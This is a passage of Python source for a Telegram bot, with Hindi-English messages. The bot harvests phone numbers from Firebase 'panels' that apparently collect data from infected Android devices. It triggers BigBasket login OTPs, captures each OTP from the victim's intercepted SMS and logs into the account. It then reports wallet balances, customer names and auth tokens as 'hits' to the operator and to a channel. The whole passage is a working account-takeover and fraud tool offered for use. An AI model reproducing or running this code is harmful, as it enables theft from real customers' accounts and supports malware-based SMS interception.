        f"🚀 <b>Starting {esc(scan_title)}!</b>\n\n"
        f"📋 <b>Total Targets:</b> <code>{total}</code> Physical SIMs\n"
        f"⚡ <b>Firebase Linked:</b> <code>{with_device}/{total}</code> Numbers\n"
        f"🏎️ <b>Concurrency:</b> <b>{MAX_SCAN_WORKERS} Multi-threaded Workers Active</b>\n\n"
        f"⏳ Initializing workers & sending OTPs in parallel..."
    )

    prog_msg = safe_send(chat_id, start_msg_text, reply_markup=stop_scan_keyboard())
    prog_id = prog_msg.message_id if prog_msg else None
    last_edit_time = [0.0]
    update_lock = threading.Lock()

    def update_progress_ui(cur_phone: str, cur_dev: str, cur_slot: str):
        with update_lock:
            state = active_scans.get(chat_id)
            if not state or not prog_id:
                return
            now_ts = time.time()
            if now_ts - last_edit_time[0] < 2.2:
                return
            last_edit_time[0] = now_ts

            p_count = state["processed"]
            pct = int((p_count / total) * 100) if total > 0 else 0
            filled = int(pct / 10)
            bar = "█" * filled + "░" * (10 - filled)
            h_count = len(state["hits"])
            zb_count = len(state["zero_bal"])

            status_text = (
                f"🔄 <b>BigBasket Multi-Threaded Scan Running...</b>\n\n"
                f"📊 <b>Progress:</b> <code>[{bar}] {pct}%</code> ({p_count}/{total})\n"
                f"📱 <b>Latest Active:</b> <code>+91 {esc(cur_phone)}</code>\n"
                f"📟 <b>Device:</b> <code>{esc(cur_dev)}</code> ({esc(cur_slot)})\n"
                f"🔥 <b>Hits Found:</b> <b>{h_count}</b> | ℹ️ <b>Zero Bal:</b> <b>{zb_count}</b>\n"
                f"🏎️ <b>Workers:</b> <code>{MAX_SCAN_WORKERS} Active Parallel Threads</code>\n\n"
                f"⏳ <i>Auto-capturing OTPs from Firebase & checking wallets...</i>"
            )
            safe_edit(chat_id, prog_id, status_text, reply_markup=stop_scan_keyboard())

    def scan_single_target(item: Dict[str, Any]):
        with scan_lock:
            state = active_scans.get(chat_id)
            if not state or not state.get("running") or state.get("stop_requested"):
                return

        phone = item["phone"]
        did = item.get("dev_id", "")
        fb_url = item.get("panel", "")
        slot = item.get("slot", "SIM 1")
        dev_name = item.get("device", "Unknown Device")

        update_progress_ui(phone, dev_name, slot)

        # 1. Quick check: Is device online? (if linked)
        if fb_url and did:
            clean_url = fb_url.rstrip("/")
            try:
                r_st = requests.get(f"{clean_url}/clients/{did}/status.json", timeout=2)
                if r_st.status_code == 200 and r_st.json() is False:
                    with scan_lock:
                        if chat_id in active_scans:
                            active_scans[chat_id]["offline"].append({"phone": phone, "device": dev_name})
                            active_scans[chat_id]["processed"] += 1
                            active_scans[chat_id]["processed_phones"].append(phone)
                            save_scan_state(chat_id)
                    return
            except Exception:
                pass

        # 2. Fetch pre-existing keys before sending OTP
        known_keys = set()
        if fb_url and did:
            known_keys = fetch_existing_message_keys(fb_url, did)

        # 3. Trigger BigBasket OTP
        bb = BigBasketClient()
        sent_ts = time.time()
        ok_send, ref_or_err = bb.send_otp(phone)

        if not ok_send:
            with scan_lock:
                if chat_id in active_scans:
                    if "does not exist" in ref_or_err.lower() or "inactive" in ref_or_err.lower():
                        active_scans[chat_id]["no_account"].append({"phone": phone, "device": dev_name})
                    else:
                        active_scans[chat_id]["failed"].append({"phone": phone, "reason": ref_or_err, "device": dev_name})
                    active_scans[chat_id]["processed"] += 1
                    active_scans[chat_id]["processed_phones"].append(phone)
                    save_scan_state(chat_id)
            return

        ref_id = ref_or_err
        otp_code = None

        # 4. Auto-catch OTP from Firebase
        stop_fn = lambda: active_scans.get(chat_id, {}).get("stop_requested", False)
        if fb_url and did:
            otp_code = watch_device_otp(fb_url, did, known_keys, sent_ts, timeout_sec=40, stop_checker=stop_fn)

        if not otp_code:
            with scan_lock:
                if chat_id in active_scans:
                    active_scans[chat_id]["timeout"].append({"phone": phone, "device": dev_name})
                    active_scans[chat_id]["processed"] += 1
                    active_scans[chat_id]["processed_phones"].append(phone)
                    save_scan_state(chat_id)
            return

        # 5. Auto-Verify OTP Login
        ok_verify, token_or_err, auth_data = bb.verify(phone, otp_code, ref_id)
        if not ok_verify:
            with scan_lock:
                if chat_id in active_scans:
                    active_scans[chat_id]["failed"].append({"phone": phone, "reason": f"Verify Failed: {token_or_err}", "device": dev_name})
                    active_scans[chat_id]["processed"] += 1
                    active_scans[chat_id]["processed_phones"].append(phone)
                    save_scan_state(chat_id)
            return

        # 6. Check BigBasket Wallet Balance
        w = bb.wallet()
        tb = w.get("total_balance", 0.0) if w else 0.0
        cb = w.get("current_wallet_balance", 0.0) if w else 0.0
        coins = w.get("neucoins", 0) if w else 0
        cust_name = w.get("name") if w and w.get("name") else "BigBasket User"

        hit_record = {
            "phone": phone,
            "total_balance": tb,
            "free_cash": cb,
            "neucoins": coins,
            "name": cust_name,
            "token": bb.token,
            "device": dev_name,
            "dev_id": did,
            "panel": item.get("panel_name") or fb_url,
            "slot": slot,
            "checked_at": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        }

        with scan_lock:
            if chat_id in active_scans:
                active_scans[chat_id]["processed"] += 1
                active_scans[chat_id]["processed_phones"].append(phone)
                if tb > 0 or cb > 0 or coins > 0:
                    active_scans[chat_id]["hits"].append(hit_record)
                else:
                    active_scans[chat_id]["zero_bal"].append(hit_record)
                save_scan_state(chat_id)

        # Instant notification on Hit
        if tb > 0 or cb > 0 or coins > 0:
            hit_card = (
                f"🎉 <b>🔥 BIGBASKET HIT FOUND!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
                f"👤 <b>Customer:</b> <b>{esc(cust_name)}</b>\n"
                f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
                f"🆓 <b>Free Usable Cash:</b> <b>₹{cb:.2f}</b>\n"
                f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
                f"📟 <b>Device:</b> <code>{esc(dev_name)}</code> ({esc(slot)})\n"
                f"🌐 <b>Panel:</b> <code>{esc(item.get('panel_name') or fb_url)}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <i>Saved to your final report!</i>"
            )
            safe_send(chat_id, hit_card)
            broadcast_hit_to_channels(hit_card, chat_id)

    # Launch multi-threaded workers
    with ThreadPoolExecutor(max_workers=MAX_SCAN_WORKERS) as executor:
        futures = [executor.submit(scan_single_target, target) for target in targets_to_run]
        for f in as_completed(futures):
            with scan_lock:
                state = active_scans.get(chat_id)
                if state and state.get("stop_requested"):
                    break

    # ============ FINISHED: COMPILE AND DIRECT DM EXPORT ============
    clear_scan_state(chat_id)
    with scan_lock:
        state = active_scans.pop(chat_id, None)

    if not state:
        return

    ts_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    hits = state.get("hits", [])
    zero_bal = state.get("zero_bal", [])
    no_account = state.get("no_account", [])
    offline = state.get("offline", [])
    timeout = state.get("timeout", [])
    failed = state.get("failed", [])
    total_scanned = len(hits) + len(zero_bal) + len(no_account) + len(offline) + len(timeout) + len(failed)
    total_cash = sum(h.get("total_balance", 0.0) for h in hits)

    hits_file_path = os.path.join(RESULTS_DIR, f"BB_HITS_{chat_id}_{ts_str}.txt")
    with open(hits_file_path, "w", encoding="utf-8") as f:
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write("🛒 BIGBASKET WALLET CHECKER — FINAL HITS REPORT\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"• Generated At:    {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n")
        f.write(f"• Total Processed: {total_scanned}\n")
        f.write(f"• Successful Hits: {len(hits)}\n")
        f.write(f"• Total Cash:      ₹{total_cash:.2f}\n")
        f.write(f"• Zero Balance:    {len(zero_bal)}\n")
        f.write(f"• Unregistered:    {len(no_account)}\n")
        f.write(f"• Offline Devices: {len(offline)}\n")
        f.write(f"• OTP Timeout:     {len(timeout)}\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

        if hits:
            for i, h in enumerate(hits, 1):
                f.write(f"⭐ HIT #{i}\n")
                f.write(f"📱 Mobile:        +91 {h['phone']}\n")
                f.write(f"👤 Customer:      {h.get('name', 'N/A')}\n")
                f.write(f"💰 Total Balance: ₹{h.get('total_balance', 0.0):.2f}\n")
                f.write(f"🆓 Free Cash:     ₹{h.get('free_cash', 0.0):.2f}\n")
                f.write(f"🪙 NeuCoins:      {h.get('neucoins', 0)}\n")
                f.write(f"📟 Device:        {h.get('device', 'N/A')} ({h.get('slot', 'SIM')})\n")
                f.write(f"🆔 Dev ID:        {h.get('dev_id', 'N/A')}\n")
                f.write(f"🌐 Panel:         {h.get('panel', 'N/A')}\n")
                f.write(f"🔑 Auth Token:    {h.get('token', '')}\n")
                f.write(f"🕒 Checked At:    {h.get('checked_at', '')}\n")
                f.write("────────────────────────────────────────────────\n\n")
        else:
            f.write("Koi ₹ > 0 balance accounts nahi mile.\n\n")

        if zero_bal:
            f.write("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            f.write(f"ℹ️ ZERO BALANCE ACCOUNTS ({len(zero_bal)})\n")
            f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            for z in zero_bal:
                f.write(f"+91 {z['phone']} | {z.get('name', 'User')} | Bal: ₹0 | Dev: {z.get('device', '')}\n")

    summary_text = (
        f"✅ <b>BigBasket Scan Complete!</b>\n\n"
        f"📊 <b>Total Processed:</b> <code>{total_scanned}</code>\n"
        f"🔥 <b>Hits Found (&gt; ₹0):</b> <b>{len(hits)}</b>\n"
        f"💰 <b>Total Cash Extracted:</b> <b>₹{total_cash:.2f}</b>\n"
        f"ℹ️ <b>Zero Balance Accounts:</b> <code>{len(zero_bal)}</code>\n"
        f"👤 <b>Unregistered on BB:</b> <code>{len(no_account)}</code>\n"
        f"📵 <b>Offline Devices:</b> <code>{len(offline)}</code>\n"
        f"⏳ <b>OTP Timeout:</b> <code>{len(timeout)}</code>\n\n"
        f"📥 <i>Aapki hits .txt file direct niche DM me bhej di gayi hai:</i>"
    )
    safe_send(chat_id, summary_text, reply_markup=main_keyboard())

    # Send document to user DM
    try:
        with open(hits_file_path, "rb") as doc:
            bot.send_document(
                chat_id,
                doc,
                caption=f"📄 <b>BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash",
                parse_mode="HTML"
            )
    except Exception as e:
        safe_send(chat_id, f"⚠️ Document delivery error: {esc(e)}")

    # Send document to storage channel
    user_ch = get_effective_channel(chat_id)
    if user_ch:
        try:
            with open(hits_file_path, "rb") as doc:
                bot.send_document(
                    int(user_ch) if str(user_ch).lstrip("-").isdigit() else user_ch,
                    doc,
                    caption=f"📦 <b>[Storage Backup] BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash"
                )
        except Exception:
            pass

# ============ FAST ONLINE PANEL SCANNER ============
def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], int, Optional[str]]:
    """Harvests ONLY currently online devices and their SIM numbers from a single Firebase panel."""
    fb_url = resolve_firebase_url(raw_panel)
    if not fb_url:
        return [], 0, "Invalid Firebase URL"
    clean_url = fb_url.rstrip("/")
    devices_dict = None

    for p in ["clients.json", "devices.json"]:
        try:
            r = requests.get(f"{clean_url}/{p}", timeout=10)
            if r.status_code == 200 and isinstance(r.json(), dict):
                devices_dict = r.json()
                break
        except Exception:
            pass

    if not devices_dict:
        return [], 0, "Database locked or empty"

    all_count = len(devices_dict)
    online_targets = []
    seen_nums = set()

    for did, dev_data in devices_dict.items():
        if not isinstance(dev_data, dict):
            continue
        if is_device_online(dev_data):
            dev_targets = audit_device_sim_slots(str(did), dev_data, fb_url, raw_panel)
            for t in dev_targets:
                if t["phone"] not in seen_nums:
                    seen_nums.add(t["phone"])
                    online_targets.append(t)

    return online_targets, all_count, None

def do_panel_scan(chat_id: int, raw_panel: str):
    """Scans a single panel for online devices."""
    fb_url = resolve_firebase_url(raw_panel)
    if not fb_url:
        safe_send(chat_id, "❌ Invalid Firebase URL!", reply_markup=main_keyboard())
        return

    with cfg_lock:
        if chat_id not in user_panels:
            user_panels[chat_id] = []
        if raw_panel not in user_panels[chat_id]:
            user_panels[chat_id].append(raw_panel)
            save_configs()

    safe_send(
        chat_id,
        f"🔍 <b>Connecting to Panel:</b> <code>{esc(raw_panel)}</code>\n"
        f"⚡ Fast-probing live online devices across panel database..."
    )

    def worker():
        try:
            online_targets, all_count, err = harvest_panel_online_targets(raw_panel)

            if err and not all_count:
                safe_send(chat_id, f"❌ Panel <code>{esc(raw_panel)}</code> par devices nahi mile ya database locked hai.", reply_markup=main_keyboard())
                return

            if not online_targets:
                safe_send(
                    chat_id,
                    f"⚠️ Panel par <b>{all_count}</b> devices mile, par abhi koi active device <b>Online</b> nahi hai.\n"
                    f"Thodi der baad dobara koshish karein jab devices active hon.",
                    reply_markup=main_keyboard()
                )
                return

            safe_send(
                chat_id,
                f"✅ <b>Harvested {len(online_targets)} Physical SIMs across {all_count} Devices!</b>\n"
                f"🟢 <b>Status:</b> All {len(online_targets)} SIMs are on <b>LIVE Online</b> devices right now.\n"
                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent BigBasket scan workers...",
                reply_markup=main_keyboard()
            )

            run_bulk_scan(chat_id, online_targets, f"Direct Panel ({raw_panel})")

        except Exception as e:
            safe_send(chat_id, f"❌ Error during panel audit: {esc(e)}", reply_markup=main_keyboard())

    threading.Thread(target=worker, daemon=True).start()

def do_scan_all_panels(chat_id: int):
    """Multi-Firebase Parallel Scanner: Probes ALL saved panels in parallel and scans all live online devices."""
    with cfg_lock:
        panels = list(user_panels.get(chat_id, []))

    if not panels:
        safe_send(chat_id, "ℹ️ Scan karne ke liye koi panels saved nahi hain. Pehle /panels me panel add karein.", reply_markup=main_keyboard())
        return

    safe_send(
        chat_id,
        f"🌐 <b>Probing {len(panels)} Panels in Parallel...</b>\n"
        f"⚡ Fast-harvesting <b>ONLY LIVE ONLINE</b> devices across all databases..."
    )

    def worker():
        try:
            all_targets = []
            seen_nums = set()
            total_devs = 0

            with ThreadPoolExecutor(max_workers=min(len(panels), 8)) as executor:
                futures = {executor.submit(harvest_panel_online_targets, p): p for p in panels}
                for f in as_completed(futures):
                    p_name = futures[f]
                    try:
                        targets, count, err = f.result()
                        total_devs += count
                        for t in targets:
                            if t["phone"] not in seen_nums:
                                seen_nums.add(t["phone"])
                                all_targets.append(t)
                    except Exception:
                        pass

            if not all_targets:
                safe_send(
                    chat_id,
                    f"⚠️ <b>{len(panels)}</b> panels me kul <b>{total_devs}</b> devices mile, par abhi koi active device <b>Online</b> nahi hai.\n"
                    f"Thodi der baad dobara koshish karein jab devices active hon.",
                    reply_markup=main_keyboard()
                )
                return

            safe_send(
                chat_id,
                f"✅ <b>Harvested {len(all_targets)} Physical SIMs across {len(panels)} Panels!</b>\n"
                f"🟢 <b>Status:</b> All {len(all_targets)} SIMs belong to <b>LIVE Online Devices</b> right now.\n"
                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent BigBasket scan workers...",
                reply_markup=main_keyboard()
            )

            run_bulk_scan(chat_id, all_targets, f"All Saved Panels ({len(panels)} Panels)")

        except Exception as e:
            safe_send(chat_id, f"❌ Error during multi-panel audit: {esc(e)}", reply_markup=main_keyboard())

    threading.Thread(target=worker, daemon=True).start()

# ============ BOT HANDLERS & MENUS ============
@bot.message_handler(commands=["start"])
def cmd_start(message):
    chat_id = message.chat.id
    with session_lock:
        user_sessions.pop(chat_id, None)

    welcome_text = (
        "<b>🛒 BigBasket Advanced Bulk Scanner & Auto-OTP Bot</b>\n\n"
        "Ye bot 100% Jio-Bot architecture par fully automated hai:\n\n"
        "<b>🔹 1. Direct Firebase Panel Engine (/panels)</b>\n"
        "• Panel se live online devices ke <b>Slot 1 & Slot 2 SIMs</b> nikalta hai.\n"
        "• 5 concurrent workers se parallel OTP send & auto-catch karke wallet check karta hai.\n\n"
        "<b>🔹 2. Scraped File Upload (Dashboard Bridge)</b>\n"
        "• Dashboard ki <code>clean_numbers_*.txt</code>, <code>all_panels_*.txt</code> ya <code>.csv</code> send karein.\n"
        "• Bot Phone, Device ID aur Panel mapping read karke auto scan karega.\n\n"
        "<b>🔹 3. Channel Logs & Storage (/channel)</b>\n"
        "• Live Hit cards and final .txt backup seedha aapke channel me broadcast honge.\n\n"
        "<b>📥 Direct DM Delivery:</b> Scan khatam hote hi final <b>Hits Report</b> seedha aapke DM me bhej di jayegi!"
    )
    safe_send(chat_id, welcome_text, reply_markup=main_keyboard())

    # Check for unfinished scan state
    saved = get_saved_scan_state(chat_id)
    if saved and (chat_id not in active_scans or not active_scans[chat_id].get("running")):
        proc_cnt = len(saved.get("processed_phones", []))
        tot_cnt = saved.get("total", len(saved.get("targets", [])))
        rem_cnt = tot_cnt - proc_cnt
        hits_cnt = len(saved.get("hits", []))

        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton(f"▶️ Resume Scan ({rem_cnt} Left)", callback_data="resume_saved_scan"),
            types.InlineKeyboardButton("🗑️ Discard & Reset", callback_data="discard_saved_scan")
        )
        safe_send(
            chat_id,
            f"⚠️ <b>Interrupted Scan Recovered!</b>\n\n"
            f"📋 <b>Title:</b> <code>{esc(saved.get('scan_title', 'Scan'))}</code>\n"
            f"📊 <b>Progress:</b> <code>{proc_cnt}/{tot_cnt}</code> SIMs checked\n"
            f"🔥 <b>Existing Hits:</b> <b>{hits_cnt}</b>\n"
            f"⏳ <b>Remaining to Check:</b> <b>{rem_cnt} SIMs</b>\n\n"
            f"Aap is scan ko wahi se continue karna chahte hain jaha yeh ruka tha?",
            reply_markup=markup
        )

@bot.message_handler(commands=["help"])
@bot.message_handler(func=lambda m: m.text == "ℹ️ Help / Commands")
def cmd_help(message):
    help_text = (
        "<b>📖 BigBasket Bot Commands:</b>\n\n"
        "• <code>/panel &lt;name_or_url&gt;</code> — Direct Firebase panel scan karein\n"
        "• <code>/panels</code> — Panel Manager menu (saved panels list, ping, scan)\n"
        "• <code>/channel</code> — Channel Logs & Storage settings dekhein\n"
        "• <code>/setchannel &lt;channel_id&gt;</code> — Custom logs channel set karein\n"
        "• <code>/check &lt;10-digit-num&gt;</code> — Single number check karein\n"
        "• <code>/stop</code> — Running scan turant rokein aur hits report download karein\n"
        "• <code>/status</code> — Current activity & scanner metrics\n"
        "• <code>/results</code> — Last scan ki hits .txt file dobara download karein\n\n"
        "💡 <i>Tip: Aap koi bhi Firebase URL direct chat me paste kar sakte hain!</i>"
    )
    safe_send(message.chat.id, help_text, reply_markup=main_keyboard())

# ============ PANEL MANAGER (/panels) ============
@bot.message_handler(commands=["panels"])
@bot.message_handler(func=lambda m: m.text == "⚙️ Panel Manager")
def show_panels_menu(message):
    chat_id = message.chat.id
    with cfg_lock:
        panels = user_panels.get(chat_id, [])

    markup = types.InlineKeyboardMarkup()
    if panels:
        if len(panels) > 1:
            markup.add(types.InlineKeyboardButton(f"🌐 Scan All ({len(panels)} Panels)", callback_data="scan_all_panels"))
        for p in panels[:10]:
            p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")[:20]
            markup.add(
                types.InlineKeyboardButton(f"🚀 Scan {p_short}", callback_data=f"scan_panel_{p}"),
                types.InlineKeyboardButton("🗑️ Del", callback_data=f"del_panel_{p}")
            )
    markup.add(
        types.InlineKeyboardButton("➕ Add New Panel", callback_data="add_panel_prompt"),
        types.InlineKeyboardButton("🔄 Ping / Health Check", callback_data="ping_panels")
    )

    p_list_str = "\n".join([f"• <code>{esc(p)}</code>" for p in panels]) if panels else "<i>Koi saved panels nahi hain.</i>"
    text = (
        f"⚙️ <b>BigBasket Panel Manager</b>\n\n"
        f"<b>Saved Panels ({len(panels)}):</b>\n{p_list_str}\n\n"
        f"👉 Niche kisi bhi panel par click karke direct scan start karein:"
    )
    safe_send(chat_id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "resume_saved_scan")
def cb_resume_saved_scan(call):
    chat_id = call.message.chat.id
    saved = get_saved_scan_state(chat_id)
    if not saved:
        try:
            bot.answer_callback_query(call.id, "No saved scan found!")
        except Exception:
            pass
        safe_send(chat_id, "ℹ️ Koi interrupted scan nahi mila ya pehle hi poora ho chuka hai.", reply_markup=main_keyboard())
        return

    try:
        bot.answer_callback_query(call.id, "Resuming scan...")
    except Exception:
        pass

    safe_send(
        chat_id,
        f"▶️ <b>Resuming Scan:</b> <code>{esc(saved.get('scan_title', 'Scan'))}</code>\n"
        f"Wahi se continue kiya ja raha hai jaha ruka tha...",
        reply_markup=main_keyboard()
    )
    threading.Thread(
        target=lambda: run_bulk_scan(
            chat_id,
            saved.get("targets", []),
            saved.get("scan_title", "BigBasket Bulk Scan"),
            resume_data=saved
        ),
        daemon=True
    ).start()

@bot.callback_query_handler(func=lambda c: c.data == "discard_saved_scan")
def cb_discard_saved_scan(call):
    chat_id = call.message.chat.id
    clear_scan_state(chat_id)
    try:
        bot.answer_callback_query(call.id, "Scan discarded!")
    except Exception:
        pass
    safe_send(chat_id, "🗑️ Interrupted scan discard kar diya gaya. Aap naya scan shuru kar sakte hain.", reply_markup=main_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "scan_all_panels")
def cb_scan_all_panels(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id, "Scanning all panels...")
    do_scan_all_panels(chat_id)

@bot.callback_query_handler(func=lambda c: c.data.startswith("scan_panel_"))
def cb_scan_panel(call):
    chat_id = call.message.chat.id
    panel = call.data.replace("scan_panel_", "")
    bot.answer_callback_query(call.id, f"Scanning {panel[:20]}...")
    do_panel_scan(chat_id, panel)

@bot.callback_query_handler(func=lambda c: c.data.startswith("del_panel_"))
def cb_del_panel(call):
    chat_id = call.message.chat.id
    panel = call.data.replace("del_panel_", "")
    with cfg_lock:
        if chat_id in user_panels and panel in user_panels[chat_id]:
            user_panels[chat_id].remove(panel)
            save_configs()
    bot.answer_callback_query(call.id, "Panel deleted!")
    safe_send(chat_id, f"🗑️ Panel <code>{esc(panel)}</code> removed.", reply_markup=main_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "add_panel_prompt")
def cb_add_panel_prompt(call):
    chat_id = call.message.chat.id
    with session_lock:
        user_sessions[chat_id] = {"state": "AWAITING_PANEL"}
    bot.answer_callback_query(call.id)
    safe_send(chat_id, "🌐 <b>Firebase Panel URL ya Name bhejein:</b>\n(e.g. <code>pani-1da70</code> ya <code>https://...</code>)", reply_markup=cancel_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "ping_panels")
def cb_ping_panels(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id, "Checking panels...")
    with cfg_lock:
        panels = user_panels.get(chat_id, [])

    if not panels:
        safe_send(chat_id, "ℹ️ Ping karne ke liye koi panels saved nahi hain.", reply_markup=main_keyboard())
        return

    safe_send(chat_id, f"🔄 Pinging <b>{len(panels)}</b> panels...")

    def ping_worker():
        report_lines = []
        for p in panels:
            fb = resolve_firebase_url(p)
            try:
                t0 = time.time()
                r = requests.get(f"{fb.rstrip('/')}/.json?shallow=true", timeout=4)
                latency = int((time.time() - t0) * 1000)
                if r.status_code == 200:
                    report_lines.append(f"🟢 <b>{esc(p)}</b> — OK ({latency}ms)")
                else:
                    report_lines.append(f"🔴 <b>{esc(p)}</b> — HTTP {r.status_code}")
            except Exception:
                report_lines.append(f"🔴 <b>{esc(p)}</b> — Offline/Locked")

        safe_send(chat_id, "📊 <b>Panel Health Report:</b>\n\n" + "\n".join(report_lines), reply_markup=main_keyboard())

    threading.Thread(target=ping_worker, daemon=True).start()

# ============ CHANNEL MANAGER (/channel) ============
@bot.message_handler(commands=["channel", "channels"])
@bot.message_handler(func=lambda m: m.text == "📢 Channel Settings")
def show_channels_menu(message):
    chat_id = message.chat.id
    cur_ch = get_effective_channel(chat_id)
    text = (
        f"📢 <b>Channel Logs & Storage Settings:</b>\n\n"
        f"• <b>Active Logs Channel:</b> <code>{esc(cur_ch or 'Not Set')}</code>\n"
        f"• <b>Master Storage:</b> <code>{esc(DEFAULT_STORAGE_CHANNEL)}</code>\n\n"
        f"Agar aap live hit cards aur .txt backups kisi Telegram channel me chahte hain:\n"
        f"1. Bot ko apne channel me <b>Admin</b> banayein.\n"
        f"2. <code>/setchannel -100xxxxxxxxxx</code> command send karein."
    )
    safe_send(chat_id, text, reply_markup=main_keyboard())

@bot.message_handler(commands=["setchannel"])
def handle_set_channel(message):
    chat_id = message.chat.id
    parts = message.text.split()
    if len(parts) > 1:
        new_ch = parts[1].strip()
        with cfg_lock:
            user_channels[chat_id] = new_ch
            save_configs()
        safe_send(chat_id, f"✅ Log Channel updated to: <code>{esc(new_ch)}</code>", reply_markup=main_keyboard())
    else:
        safe_send(chat_id, "Usage: <code>/setchannel -100xxxxxxxxxx</code>", reply_markup=main_keyboard())

# ============ STOP & STATUS ============
@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    chat_id = message.chat.id
    with scan_lock:
        if chat_id in active_scans:
            active_scans[chat_id]["stop_requested"] = True
            safe_send(chat_id, "🛑 <b>Stopping scan...</b> Workers abort kar rahe hain, final report compile ho rahi hai.", reply_markup=main_keyboard())
        else:
            safe_send(chat_id, "ℹ️ Koi active scan nahi chal raha hai.", reply_markup=main_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "stop_current_scan")
def cb_stop_scan(call):
    chat_id = call.message.chat.id
    with scan_lock:
        if chat_id in active_scans:
            active_scans[chat_id]["stop_requested"] = True
            bot.answer_callback_query(call.id, "🛑 Stopping scan...")
            safe_send(chat_id, "🛑 <b>Scan stopped by user!</b> Compiling report...")
        else:
            bot.answer_callback_query(call.id, "Koi scan active nahi hai.")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    chat_id = message.chat.id
    with scan_lock:
        is_running = chat_id in active_scans and active_scans[chat_id].get("running")
        cur_info = active_scans.get(chat_id, {})

    status_card = (
        f"🟢 <b>Bot Status: Online</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ <b>Scanner Engine:</b> {'🏃 Running (' + str(MAX_SCAN_WORKERS) + ' Workers)' if is_running else '💤 Idle'}\n"
        f"📊 <b>Progress:</b> {cur_info.get('processed', 0)} / {cur_info.get('total', 0)}\n"
        f"🔥 <b>Hits Found:</b> {len(cur_info.get('hits', []))}\n"
        f"🛡️ <b>Client TLS:</b> Chrome120 Native (curl_cffi)\n"
        f"📢 <b>Log Channel:</b> <code>{esc(get_effective_channel(chat_id))}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_send(chat_id, status_card, reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == "📊 View Latest Hits")
@bot.message_handler(commands=["results"])
def cmd_results(message):
    chat_id = message.chat.id
    files = [f for f in os.listdir(RESULTS_DIR) if f.startswith(f"BB_HITS_{chat_id}_")]
    if not files:
        files = [f for f in os.listdir(RESULTS_DIR) if f.startswith("BB_HITS_")]

    if not files:
        safe_send(chat_id, "ℹ️ Abhi tak koi hits save nahi hue hain. Pehle scan run karein!", reply_markup=main_keyboard())
        return

    files.sort(reverse=True)
    latest = os.path.join(RESULTS_DIR, files[0])
    try:
        with open(latest, "rb") as doc:
            bot.send_document(
                chat_id,
                doc,
                caption=f"📄 <b>Latest Hits Report:</b> <code>{esc(files[0])}</code>",
                parse_mode="HTML"
            )
    except Exception as e:
        safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")

# ============ METHOD 2: FILE UPLOAD HANDLER ============
@bot.message_handler(content_types=["document"])
def handle_document_upload(message):
    chat_id = message.chat.id
    doc = message.document
    fname = doc.file_name or "uploaded_file.txt"

    safe_send(chat_id, f"📥 <b>Analyzing file:</b> <code>{esc(fname)}</code>...")

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        save_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{int(time.time())}_{fname}")
        with open(save_path, "wb") as f:
            f.write(downloaded)

        with cfg_lock:
            user_p = user_panels.get(chat_id, [])
        fallback_p = user_p[0] if user_p else ""
        targets = parse_scraped_file(save_path, fallback_panel=fallback_p)

        if not targets:
            safe_send(
                chat_id,
                "❌ <b>No valid physical numbers found in the file!</b>\n"
                "Kripya Dashboard ki <code>clean_numbers_*.txt</code> upload karein.",
                reply_markup=main_keyboard()
            )
            return

        with_meta = sum(1 for t in targets if t.get("dev_id") and t.get("panel"))
        panels_found = list(set(t.get("panel_name") or t.get("panel") for t in targets if t.get("panel")))

        safe_send(
            chat_id,
            f"✅ <b>File Parsed Successfully!</b>\n\n"
            f"📁 <b>File:</b> <code>{esc(fname)}</code>\n"
            f"📱 <b>Physical SIM Numbers:</b> <b>{len(targets)}</b>\n"
            f"⚡ <b>Device ID Linked:</b> <b>{with_meta}/{len(targets)}</b>\n"
            f"🌐 <b>Panels:</b> {esc(', '.join(panels_found) if panels_found else 'Global/Saved')}\n\n"
            f"🚀 <i>Launching {MAX_SCAN_WORKERS} parallel BigBasket scan workers...</i>",
            reply_markup=main_keyboard()
        )

        threading.Thread(target=run_bulk_scan, args=(chat_id, targets, f"Scraped File ({fname})"), daemon=True).start()

    except Exception as e:
        safe_send(chat_id, f"❌ <b>Error parsing file:</b> {esc(e)}", reply_markup=main_keyboard())

# ============ METHOD 1: DIRECT PANEL SCANNER ============
